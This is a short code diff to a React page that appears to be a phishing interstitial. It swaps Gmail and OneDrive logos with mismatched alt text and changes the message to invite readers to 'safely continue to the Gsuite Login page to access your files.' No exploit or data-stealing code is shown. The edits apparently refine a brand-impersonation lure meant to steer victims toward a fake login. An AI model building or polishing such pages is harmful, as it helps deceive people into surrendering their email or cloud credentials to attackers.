@@ -43,8 +43,8 @@ function App() {
       <div className="bg-white rounded-2xl shadow-2xl max-w-xl w-full p-6 text-center">
         <div className="mb-4 flex justify-center">
           <img
-            src="https://download.logo.wine/logo/Gmail/Gmail-Logo.wine.png"
-            alt="OneDrive Logo"
+            src="https://download.logo.wine/logo/OneDrive/OneDrive-Logo.wine.png"
+            alt="Gmail Logo"
             className="h-20 w-auto"
           />
         </div>
@@ -54,7 +54,7 @@ function App() {
         </h1>
 
         <p className="text-base text-gray-600 mb-6 leading-relaxed">
-          You are being redirected.
+          You can now safely continue to the Gsuite Login page to access your files.
         </p>
 
         <div className="flex justify-center">
